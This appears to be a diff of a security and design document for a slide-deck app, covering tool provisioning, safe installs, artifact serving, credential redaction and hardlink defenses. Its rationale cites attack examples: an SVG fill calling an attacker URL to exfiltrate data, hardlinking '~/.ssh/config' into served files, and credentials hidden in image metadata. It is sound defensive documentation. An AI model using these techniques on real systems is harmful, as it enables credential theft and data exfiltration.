@@ -97,7 +97,7 @@ honestly:
 
 - **`pdftoppm` — provided, on every OS, with no download.** `pypdfium2` is already
   a dependency of the engine's own venv, so the capability is on disk the moment
-  the engine is provisioned; what was missing was a command of that name.
+  the engine is provisioned; what the app adds is a command of that name.
   `preview_tools.install_pdftoppm()` writes a launcher (`pdftoppm`, or
   `pdftoppm.cmd` on Windows so `shutil.which` resolves it via `PATHEXT`) that
   execs the engine interpreter against `pdftoppm_shim.py`. The shim implements
@@ -146,24 +146,27 @@ compute it identically via `provision.mcp_tools_path()`).
 
 1. `engine.optional_dep_path()` probes `PATH` before the managed dir. This governs
    what `/deps` REPORTS.
-2. `mcp_tools_path()` **appends** the managed dir to the inherited `PATH`. This
-   governs what actually EXECUTES. Prepending would let the shim shadow a real
+2. `mcp_tools_path()` **appends** to the inherited `PATH`, in this order: the
+   inherited `PATH`, then the Windows LibreOffice install dir when one is found
+   (`engine.soffice_install_dir()`), then the managed preview-tools `bin` when it
+   exists. This governs what actually EXECUTES. Prepending would let the shim shadow a real
    poppler — silently downgrading a full tool to the shim's compatibility subset
    while `/deps` still reported the system one. It also never emits an empty
    `PATH` element, since an empty element means the CWD on POSIX and would make
-   tool resolution depend on where the MCP server was started.
+   tool resolution depend on where the MCP server is started.
 
 **`install_pdftoppm()` runs BEFORE `_render_agents()`** inside `provision()`, and the
 order is load-bearing: `mcp_tools_path()` only adds the managed directory once it
-exists, so rendering first baked a `PATH` without it on every first-ever provision.
-The launcher then landed in a directory no agent config named, thumbnails stayed
-broken until the next gateway boot re-rendered, and `/deps` reported the tool
-present the whole time because it probes the directory directly.
+exists, so rendering first would bake a `PATH` without it on every first-ever
+provision. The launcher would then land in a directory no agent config names,
+thumbnails would stay broken until the next gateway boot re-rendered, and `/deps`
+would report the tool present the whole time because it probes the directory
+directly.
 
 `TestRenderAgents` pins all of this at the layer that matters: it asserts the
 engine's own `shutil.which()` against the RENDERED `env.PATH`, and asserts the
 install-then-render call order. Deleting the template's `PATH`, flipping the append
-order, or restoring the old install-after-render order each fail a test. Asserting
+order, or rendering before installing each fail a test. Asserting
 only on a gateway-side overlay dict caught none of them.
 
 This mirrors the precedence `papyrus.latex.find_compiler_sync` gives a real TeX
@@ -261,12 +264,12 @@ failure, namely "still on the previous version". Pinned by
 
 The `finalize` callback runs at the FINAL path while the retired tree is still on
 disk — the one window a step needing the real path can be undone — and **a finalizer
-that RAISES takes the same unwind as one that returns False.** Anything else was
-silent data loss: the exception escaped the finalize branch, the `except OSError`
-handler restores only when `engine_root` does not exist (and the new tree is sitting
-there), so the `finally` saw a populated root and deleted the retired tree — removing
-the user's working engine and leaving an unfinalized one in its place. A
-non-`OSError` was not covered at all. The rollback catches `BaseException`
+that RAISES takes the same unwind as one that returns False.** Anything else would
+be silent data loss: the exception would escape the finalize branch, the `except
+OSError` handler restores only when `engine_root` does not exist (and the new tree is
+sitting there), so the `finally` would see a populated root and delete the retired
+tree — removing the user's working engine and leaving an unfinalized one in its
+place. The rollback catches `BaseException`
 deliberately: with the only engine moved aside, the tree must go back even on
 `KeyboardInterrupt`, and the exception is re-raised afterwards so nothing is
 swallowed. On a FIRST install the new tree is still removed rather than left in
@@ -289,7 +292,7 @@ call `bridges.register_app`, and `bridges._placeholder_values` computes this app
 `{UV_BIN}` / `{ENGINE_ROOT}` / `{ENGINE_MCP_DIR}` / `{APP_PROMPTS}` in the GATEWAY from
 the data home and the installed package — the same values the provisioner resolves — so
 the agents and skill land without the provisioner registering anything. Registering here
-was redundant AND an unclosable race: provisioning is a detached job that runs for
+would be redundant AND an unclosable race: provisioning is a detached job that runs for
 minutes, so an operator can disable the app mid-run, and the enable re-check cannot be
 atomic (the lifecycle lock is an `asyncio.Lock`; this runs synchronously on a worker
 thread). A disable that deregisters and *then* sets `enabled=false` reads as
@@ -318,22 +321,19 @@ as `papyrus`.
 `uv` is a declared Python dependency (`setup.cfg` `install_requires`), so a stock
 `pip install kirocrew` always HAS the binary — but not necessarily on `PATH`: a
 wheel install puts it in the venv's scripts dir, and the gateway may run with a
-minimal `PATH` (an installed launchd/systemd service). `provision.resolve_uv()`
-therefore resolves it through the installed package and hands the two `uv` call
-sites an **absolute path**, never the bare string `"uv"`. Order, widest-trust
-first, cached process-wide:
+minimal `PATH` (an installed launchd/systemd service). The ladder lives in
+`kiro_crew.env.resolve_uv()`, shared with pod provisioning so the minimal-`PATH`
+case is handled in one place; `provision.resolve_uv()` caches its answer
+process-wide and hands the two `uv` call sites an **absolute path**, never the
+bare string `"uv"`. Order, widest-trust first:
 
 1. `uv.find_uv_bin()` — the wheel's own locator (the normal `pip` case). It raises
-   `UvNotFound`, a `FileNotFoundError` subclass, on an odd repackaging;
-2. the **frozen-bundle location** — `sys._MEIPASS` and `dirname(sys.executable)`,
-   joined with `uv` + `sysconfig`'s `EXE`. A frozen one-folder bundle has no
-   scripts dir and no site-packages, so the wheel's locator cannot find anything
-   there and the binary is staged at the bundle root instead. Inert on the
-   current desktop bundle, which ships a real interpreter tree the locator walks;
-3. `shutil.which("uv")` — a user's own, possibly newer, uv still works;
-4. `None`, which fails provisioning with a message naming **only** `uv` (the old
-   check said "`git` and `uv` must both be installed and on PATH" even when only
-   one was missing, and `git` is no longer used at all).
+   `UvNotFound`, a `FileNotFoundError` subclass, on an odd repackaging, and a path
+   it returns is trusted only when the file exists;
+2. `shutil.which("uv")` — a user's own, possibly newer, uv still works. A hit
+   through a relative `PATH` entry (`.`, `bin`) is skipped rather than
+   absolutized;
+3. `None`, which fails provisioning with a message naming **only** `uv`.
 
 `resolve_uv()` never raises: provisioning is a detached background job whose only
 channel to the user is its log.
@@ -406,8 +406,7 @@ are dropped, so an upstream setuid or group-writable bit cannot survive install.
 
 `engine_source.write_source_marker()` writes `.kirocrew-engine.json` (tag, commit,
 digest, repo) into the tree as the **last** step of a verified install, so its
-presence is the "this is the vetted tree" signal that `(root / ".git").is_dir()`
-used to provide. `is_installed()` requires BOTH the commit and the digest to match
+presence is the "this is the vetted tree" signal; no `.git` directory is consulted. `is_installed()` requires BOTH the commit and the digest to match
 the current pin, so bumping either makes an existing install re-fetch instead of
 silently keeping an older engine, and a tree left behind by an older git-based
 install (no marker) correctly reads as "not installed".
@@ -416,8 +415,7 @@ install (no marker) correctly reads as "not installed".
 describe` — cheap enough for the status endpoints that call it on every poll, and
 **honest**: an unverified or absent tree reports `"unknown"` rather than the tag
 this code happens to be pinned to. The `/engine` response keeps its `clone` key
-as the wire name the dashboard already reads; what it now reports is
-`engine_source.is_installed`.
+as the wire name the dashboard reads; it reports `engine_source.is_installed`.
 
 ## Agents
 
@@ -472,7 +470,9 @@ sensitive-path check and the governance ceiling — would never be reached.
   `.md`, `.html` and `.pptx` (`SERVED_SUFFIXES`), each with its own Content-Type,
   `no-store` and `X-Content-Type-Options: nosniff`. Deck contents are ultimately
   model-influenced, so an unexpected extension has no business reaching a browser.
-  HTML artifacts additionally carry `default-src 'none'` CSP.
+  `text/html` and `image/svg+xml` artifacts (`_SCRIPT_CAPABLE_CONTENT_TYPES`, both
+  script-capable documents) additionally carry `_ARTIFACT_HTML_CSP`:
+  `default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; sandbox`.
 - **Agent-authored IDENTIFIERS are refused, not redacted.** These fields name a
   filesystem path AND a URL segment the browser sends back, so scrubbing them would
   hand out a handle that resolves to nothing. Refusal is scoped as narrowly as the
@@ -486,10 +486,10 @@ sensitive-path check and the governance ceiling — would never be reached.
 
   Everything reachable only inside a URL — preview and compose filenames, the spec
   filenames, `output.pptx` — is covered by the `_preview_url` screen alone. **That
-  central placement is the point:** this was the identical defect three times running
-  (`deckId`, then the slide slug, then a preview PNG filename), each time one field
-  over from the last fix, so the check now sits at the single place all seven callers
-  build a URL rather than at the callers.
+  central placement is the point:** a per-field check misses the next field over
+  (`deckId`, the slide slug, a preview PNG filename are all the same defect), so the
+  check sits at the single place all seven callers build a URL rather than at the
+  callers.
 
   The slug case is reachable only through `_slide_order`'s FALLBACK: `outline.md`
   slugs match `[a-z0-9-]+` and cannot spell an access key, but with no outline the
@@ -497,10 +497,10 @@ sensitive-path check and the governance ceiling — would never be reached.
 - **Credential redaction on served artifact text.** Every deck artifact is written
   by the presentation-engine agent from model output, so a TEXTUAL one crossing
   `/preview` is agent content reaching a user surface — the same boundary
-  `decks.py` already redacts the deck NAME and the brief PREVIEW at. Serving the
-  same files' full contents raw was therefore an inconsistent hole, not a
-  deliberate exemption: a credential the model echoed into a brief, an outline or a
-  compose payload reached the dashboard verbatim. `_read_artifact` now runs
+  `decks.py` redacts the deck NAME and the brief PREVIEW at. Serving the same
+  files' full contents raw would be an inconsistent hole: a credential the model
+  echoed into a brief, an outline or a compose payload would reach the dashboard
+  verbatim. `_read_artifact` runs
   `security.redact` (credentials + exfiltration URLs) over the textual suffixes.
   Three properties make this safe in both directions:
   - **The text/binary split is data, not a code path.** `SERVED_SUFFIXES` maps each
@@ -529,17 +529,19 @@ sensitive-path check and the governance ceiling — would never be reached.
     than a fact — and `AKIA…` is entirely base64-alphabet, so excising on the label
     alone would turn the carve-out into a smuggling channel (wrap a key in a fake
     bitmap URI and skip the scanner). A blob is therefore excised only if its
-    decoded head actually begins with a real raster signature (`_BITMAP_MAGIC` /
-    `_is_real_bitmap`: PNG, JPEG, GIF, RIFF/WebP, BMP, and the offset `ftyp` box for
+    decoded head actually begins with a real raster signature
+    (`routes._has_bitmap_signature`: the shared `messaging.raster.sniff_raster_mime`
+    table, which `messaging/raster.py` owns, plus the `ftyp` box at offset 4 for
     AVIF/HEIF). Anything else stays in the text and is scanned as ordinary prose.
     Both directions are pinned per format: a fake bitmap body cannot carry a
     credential, and every real signature survives.
     **And the signature is necessary, not sufficient.** A correct header only proves
     the first eight bytes, while every container here (PNG `tEXt`, JPEG `COM`, EXIF,
     WebP `XMP `) has a metadata chunk that holds arbitrary text — so a blob beginning
-    `\x89PNG…` and continuing `tEXtComment\0AKIA…` passed the header check, skipped
-    the scan, and reached the browser verbatim. `_is_real_bitmap` therefore decodes
-    the WHOLE body and exempts it only if the redactor finds nothing in it; a
+    `\x89PNG…` and continuing `tEXtComment\0AKIA…` would pass a header-only check,
+    skip the scan, and reach the browser verbatim. `routes._scanned_bitmap_bytes`
+    therefore decodes the WHOLE body and exempts it only if the redactor finds
+    nothing in it (and the encoded text passes the encoded-credential screen below); a
     credential-bearing "image" stays in the redaction path and loses the picture,
     which is the right trade. Pinned by
     `::test_a_credential_in_bitmap_metadata_is_not_exempted` and
@@ -548,8 +550,9 @@ sensitive-path check and the governance ceiling — would never be reached.
     re-encoding of what was scanned.** A credential APPENDED to a genuine raster's
     base64 is itself base64-alphabet text, so `_INLINE_BITMAP_RE` swallows it, the head
     still carries a real signature, and decoding the appended ASCII yields binary
-    NOISE — so the decoded-bytes scan legitimately passes. Restoring `match.group(0)`
-    then reproduced the key byte-for-byte. Both halves of the fix are load-bearing:
+    NOISE — so the decoded-bytes scan legitimately passes, and restoring
+    `match.group(0)` would reproduce the key byte-for-byte. Both halves are
+    load-bearing:
     `_scanned_bitmap_bytes` returns the validated BYTES (so the caller can only restore
     what was cleared, and anything the decoder discarded is discarded too), and it also
     runs `_ENCODED_CREDENTIAL_RE` over the encoded text. That screen is deliberately
@@ -590,20 +593,19 @@ sensitive-path check and the governance ceiling — would never be reached.
     **A condemned region is excised here, not delegated.** Handing it to the text pass
     assumed `redact()` recognises the same tokens this scan does; it recognises fewer
     (a `gh[pousr]_` body shorter than a real 36-char PAT matches here and is invisible
-    there), so delegating served those tokens. `_scanned_bitmap_bytes` returns
+    there), so delegating would serve those tokens. `_scanned_bitmap_bytes` returns
     `(bytes, credential_found)` and the caller replaces a credential-bearing region
     with the shared `REDACTED_CREDENTIAL_TAG`, while a blob that merely is not a raster
     still falls through to ordinary prose scanning. Pinned by
     `::test_a_credential_APPENDED_to_a_real_raster_is_not_exempted`,
-    `::test_appended_tokens_whose_separator_is_not_base64_are_caught`,
-    `::test_a_raster_whose_base64_contains_a_token_prefix_still_renders` and
-    `::test_text_butted_against_a_data_uri_is_not_silently_dropped`.
+    `::test_appended_tokens_whose_separator_is_not_base64_are_caught` and
+    `::test_a_raster_whose_base64_contains_a_token_prefix_still_renders`.
   - **Decode degrades, never crashes.** Text is decoded `errors="replace"` and
     re-encoded to UTF-8; a malformed byte sequence cannot raise on the worker
     thread and become an opaque 500. The declared Content-Type carries
-    `charset=utf-8` for every textual suffix because that is what the body now
+    `charset=utf-8` for every textual suffix because that is what the body
     actually is, and it is set via the response HEADER (aiohttp refuses a charset in
-    the `content_type=` kwarg, which previously truncated it). Redaction changes
+    the `content_type=` kwarg). Redaction changes
     byte length, which is why `MAX_ARTIFACT_BYTES` is checked on the READ — the
     resource actually being bounded — and no `Content-Length` is set by hand;
     aiohttp derives it from the final body, so it can never be a stale
@@ -623,7 +625,8 @@ sensitive-path check and the governance ceiling — would never be reached.
   resolution, which served that directory's file. The helper opens first and then
   resolves the DESCRIPTOR's real path (`/proc/self/fd` on Linux, `F_GETPATH` on
   macOS), requiring it inside `within_root`, so the inode validated is the inode
-  read and no check-to-use window remains (its documented R33 F1 case). It also
+  read and no check-to-use window remains (see
+  `hook_runtime/safe_reads.py::safe_read_file_bytes_nolink`). It also
   rejects hardlinks and non-regular files, and fails closed when the fd's path
   cannot be determined. The root comes from a separate `resolve_deck_dir` call, never
   from `resolved.parent` — a root derived from the path under attack would validate
@@ -642,8 +645,8 @@ sensitive-path check and the governance ceiling — would never be reached.
 - **`bgFill` is guarded separately, because it never enters the walk.** Every
   payload fragment goes through `setSvgFragment` → `scrubExternalRefs`, but the
   slide's background colour is applied straight onto a `<rect>` — and a `fill`
-  accepts a FuncIRI, so an agent-authored `url(https://attacker/?d=…)` there was a
-  live GET on the dashboard's own origin, bypassing all of the above. It now passes
+  accepts a FuncIRI, so an agent-authored `url(https://attacker/?d=…)` there would be
+  a live GET on the dashboard's own origin, bypassing all of the above. It passes
   through the same `urlRefsAreLocal` rule and falls back to `transparent` when
   rejected, so a same-document `url(#brandGradient)` still works (the deck's
   gradients live in the shared `defs`) while anything off-origin does not. `viewBox`
@@ -733,8 +736,10 @@ sensitive-path check and the governance ceiling — would never be reached.
   over the download STREAM before extraction, and extracted with every archive
   member validated (no traversal, no absolute names, regular files and dirs only,
   bounded size). See Provisioning → Safe extraction.
-- **Bounded uploads.** Style ≤ 4 MB, template ≤ 64 MB, read in chunks rather than
-  by trusting `Content-Length`. A `.pptx` must start with the zip magic and a
+- **Bounded uploads.** Both import routes read the body in 64 KiB chunks, at most
+  64 MiB, rather than trusting `Content-Length`; a style is then refused above
+  4 MiB (`MAX_STYLE_BYTES`) and a template above 64 MiB (`MAX_TEMPLATE_BYTES`),
+  each with 413 `payload_too_large`. A `.pptx` must start with the zip magic and a
   style must contain markup, so a mislabelled upload is refused before it reaches
   the engine's analyzer.
 - **Deny-by-default.** All handlers wrapped in `_require_enabled`; the gate runs
@@ -756,22 +761,22 @@ sensitive-path check and the governance ceiling — would never be reached.
   `specs/brief.md` and `specs/outline.md`, and it goes through
   `hooks.safe_read_file_bytes_nolink` with the deck dir as `within_root`. Same hardlink
   reasoning as the library reads below — `contained_deck_file` stops a symlink but
-  cannot see a hardlink — so `os.link("~/.ssh/config", "specs/brief.md")` previewed SSH
-  configuration onto the Deck list, which every visit to the app loads. Centralized
-  rather than fixed per reader **because the per-reader approach demonstrably failed**:
-  this defect was reported three times in this module, each time one reader over from
-  the previous fix. A fourth reader now cannot reintroduce it. A hostile deck degrades
+  cannot see a hardlink — so `os.link("~/.ssh/config", "specs/brief.md")` would preview
+  SSH configuration onto the Deck list, which every visit to the app loads. Centralized
+  rather than fixed per reader, because a per-reader fix misses the next reader over;
+  a new reader cannot reintroduce it. A hostile deck degrades
   to its directory name with an empty brief; honest decks are unaffected. Pinned by
   `test_pptx_maker_decks.py::test_hardlinked_deck_files_are_not_read`.
 - **Library reads are pinned to the opened inode, because a HARDLINK defeats every
   path check.** `resolve_library_file` resolves and re-checks containment, which stops
   a symlink — but a hardlink has no target to resolve: `is_symlink()` is False and
   `resolve()` returns the path itself, so a path-based gate cannot see it. The styles
-  dir is agent-writable, so `os.link("~/.ssh/config", "styles/pwned.html")` made
+  dir is agent-writable, so `os.link("~/.ssh/config", "styles/pwned.html")` would make
   `GET /styles` and `GET /style` serve SSH configuration to the dashboard. Both read
-  paths (`list_styles`' cover extraction and `style_html`) now go through
+  paths (`list_styles`' cover extraction and `style_html`) go through
   `hooks.safe_read_file_bytes_nolink` with the matched style dir as `within_root`,
-  which rejects `st_nlink > 1` on the OPENED descriptor (its documented R30 F1 case)
+  which rejects `st_nlink > 1` on the OPENED descriptor (see
+  `hook_runtime/safe_reads.py::safe_read_file_bytes_nolink`)
   along with non-regular files and any fd whose real path escapes the root. The root
   is the dir the lookup MATCHED, never `path.parent` — a parent taken from the path
   under attack would validate the escape against itself. Pinned by
@@ -780,8 +785,8 @@ sensitive-path check and the governance ceiling — would never be reached.
 - **SEL audit fields are redacted at the chokepoint.** `_audit` runs `redact` over
   both free-text fields. Every call site interpolates a user- or agent-chosen value —
   a style/template name, a deck root, a `deckId/subpath`, an exception string — and an
-  `AKIA`-shaped name is legal under `SEGMENT_RE`, so the credential was written
-  verbatim into the SEL and served back by `GET /api/sel/events`. An audit log is a
+  `AKIA`-shaped name is legal under `SEGMENT_RE`, so without redaction the credential
+  would be written verbatim into the SEL and served back by `GET /api/sel/events`. An audit log is a
   user-facing surface, and a *durable* one: unlike a response body, a leak there
   persists. Redaction is centralized in `_audit` rather than repeated at each call
   site, so a future caller cannot omit it, and it runs BEFORE the 200-char truncation
@@ -794,19 +799,19 @@ sensitive-path check and the governance ceiling — would never be reached.
   engine snippets do `get_state()` → mutate `template_metadata` → `update_state(...)`
   in a subprocess: `library.import_template` (via `engine.analyze_template`) and
   `provision` (via `engine.scan_new_templates`). Left unlocked, two concurrent
-  imports — or an import overlapping background provisioning — each read the map
-  before either wrote it, so the second write silently dropped the other template's
-  metadata while both reported success. This is the same lost-update shape the
+  imports — or an import overlapping background provisioning — would each read the
+  map before either wrote it, so the second write would silently drop the other
+  template's metadata while both reported success. This is the same lost-update shape the
   `O_EXCL` name claim fixes for the template FILE, one level up at the shared
   metadata document. Holding the lock across the subprocess is safe because these
   paths are already `BLOCKING` and run via `off_loop`; the cost is that concurrent
   template imports serialize, which is the intended trade for a rare user action.
   Pinned by `test_pptx_maker_library.py::test_the_analysis_runs_under_the_state_lock`.
   **The rename verbs hold it across the file MOVE as well**, not just the state write.
-  Split, a concurrent delete of the new name interleaved between the `os.link` and the
-  state update, leaving `state.json` naming a file that no longer existed while both
-  verbs answered 200. The move is what makes the state stale, so it belongs inside the
-  same critical section — which is what `delete_style`/`delete_template` already did.
+  Split, a concurrent delete of the new name could interleave between the `os.link`
+  and the state update, leaving `state.json` naming a file that does not exist while
+  both verbs answer 200. The move is what makes the state stale, so it belongs inside the
+  same critical section, as in `delete_style`/`delete_template`.
   `os.link` is kept under the lock rather than replaced: a process-local lock cannot
   arbitrate against anything else sharing the library directory, and the atomic
   `FileExistsError` still supplies the 409. Pinned by
@@ -841,7 +846,8 @@ sensitive-path check and the governance ceiling — would never be reached.
 `website/src/apps/pptx-maker/`, registered at `/pptx-maker` in
 `builtinRegistry.ts`. Standard page layout (`PageHeader` + `px-6 pb-8` container +
 StatCard row + `Card`/`CardTitle`), three views behind a `SegmentedControl`:
-Decks, Library, Settings. i18n keys under `apps.pptxMaker.*` in all 10 catalogs.
+Decks, Library, Settings. i18n keys under `apps.pptxMaker.*` in every shipped catalog (see
+[`website/docs/i18n-catalog.md`](../../../website/docs/i18n-catalog.md)).
 
 | File | Role |
 |------|------|
@@ -868,7 +874,9 @@ state immediately.
 ## Tests
 
 Backend coverage spans the repo-level `test/test_pptx_maker_*.py` files and the
-package-local `src/kiro_crew/apps/builtins/pptx_maker/tests/` suite.
+package-local `src/kiro_crew/apps/builtins/pptx_maker/tests/` suite; the list below
+is not exhaustive (`test_pptx_maker_owner_gate.py` and `test_pptx_maker_agents.py`
+also cover the owner gate and the agent templates).
 `setup.cfg` sets `testpaths = test src/kiro_crew/apps/builtins`, so both locations
 are collected by CI:
 `..._paths.py` (segment grammar, traversal, symlink escape, deck-root
@@ -881,20 +889,22 @@ CSP header, artifact redaction — an `AKIA`-shaped credential in a served
 byte-identical, inline raster art survives, an undecodable byte sequence does not
 raise — `PUT /config` key equality, no `/deps/install`), `..._engine.py`
 (readiness probes, marker-derived tag, snippet spawning),
-`..._provision.py` (the `uv` resolver's four legs incl. the frozen-bundle one, the
+`..._provision.py` (the cached `uv` resolver, the
 credential-scrubbing spawn, provisioning's failure ladder),
 `..._engine_source.py` (digest refusal, URL-override scheme check, tar traversal /
-symlink / device / bomb refusal on BOTH the 3.11+ and the 3.10 extraction leg,
+symlink / device / bomb refusal on BOTH the `extractall(filter=...)` leg and the
+`TypeError` fallback leg that applies the filter per member,
 source-marker honesty, previous-tree preservation), and `..._preview_tools.py`
 (the shim's poppler-compatible output naming and sizing flags against REAL PDFs,
 its refuse-rather-than-mis-render behavior, and the launcher's install —
 executable, not group-writable, idempotent, refused before the engine venv exists,
 and runnable from a data-home path containing `$`/backtick/quote/space, which
-plain double-quoting corrupted). Package-local tests additionally pin Windows/POSIX
+plain double-quoting would corrupt). Package-local tests additionally pin Windows/POSIX
 venv paths and Windows LibreOffice discovery plus rendered-`PATH` precedence. No
 real subprocess is ever spawned against the engine and no test reaches the network.
 
-Frontend: `website/src/test/PptxMakerPage.test.tsx` — the pure helpers
+Frontend (also not exhaustive: `PptxDeckViewerCov80.test.tsx` and
+`SlidePreviewCoverage.test.tsx` add coverage): `website/src/test/PptxMakerPage.test.tsx` — the pure helpers
 plus the page against a mocked API (layout contract, engine banner states, deck
 selection, library and settings views). `SlidePreviewSanitize.test.tsx` is
 deliberately a SECOND file — `PptxMakerPage.test.tsx` mocks both
